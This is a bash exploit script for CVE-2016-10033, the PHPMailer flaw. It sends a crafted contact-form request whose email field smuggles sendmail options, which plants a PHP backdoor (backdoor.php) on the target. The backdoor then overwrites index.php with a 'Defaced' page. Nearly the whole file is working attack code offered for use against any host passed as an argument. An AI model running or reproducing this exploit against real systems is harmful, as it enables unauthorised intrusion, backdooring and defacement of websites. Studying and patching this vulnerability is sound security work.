#!/bin/bash
# CVE-2016-10033 exploit by opsxcq
# https://github.com/opsxcq/exploit-CVE-2016-10033

echo '[+] CVE-2016-10033 exploit by opsxcq'

if [ -z "$1" ]
then
    echo '[-] Please inform an host as parameter'
    echo '    Example: ./deface.sh localhost:8080 "Message goes here" '
    exit -1
fi

if [ $(uname) == 'Darwin' ]
then
    decoder='base64 -D'
elif [ $(uname) == 'Linux' ]
then
    decoder='base64 -d'  
else
    echo '[-] Your platform isnt supported: '$(uname)
    exit -1
fi


host=$1

echo '[+] Exploiting '$host

curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n<?php $x=fopen("/www/index.php","w");fwrite($x,base64_decode($_GET["cmd"]));fclose($x); ?>\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"vulnerables\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n' >/dev/null && echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'


echo '[+] Checking if the backdoor was created on target system'
code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' "http://$host/backdoor.php")

if [ "$code" != "200" ]
then
    echo '[-] Target cant be exploited'
    exit -1
else
    echo '[+] Backdoor.php found on remote system'
fi

echo '[+] Placing your message in the server'

cmd='PGh0bWw%2BPGhlYWQ%2BPC9oZWFkPjxib2R5IHN0eWxlPSJtYXJnaW46IDBweDsiPjxkaXYgc3R5bGU9Im1hcmdpbjogMDtwYWRkaW5nOiAwO2JvcmRlcjogMDtoZWlnaHQ6IDEwMCU7YmFja2dyb3VuZDogYmxhY2s7Y29sb3I6IGdyZWVuO2Rpc3BsYXk6IGZsZXg7ZmxleC1kaXJlY3Rpb246IGNvbHVtbjtqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjt0ZXh0LWFsaWduOiBjZW50ZXI7Ij48aDE%2BRGVmYWNlZDwvaDE%2BPC9kaXY%2BPC9ib2R5PjwvaHRtbD4%3D'
if ! curl -sq "http://$host/backdoor.php?cmd=$cmd" >/dev/null
then
        echo '[-] Connection problens'
        exit -1
fi
echo '[+] Job done, exiting'
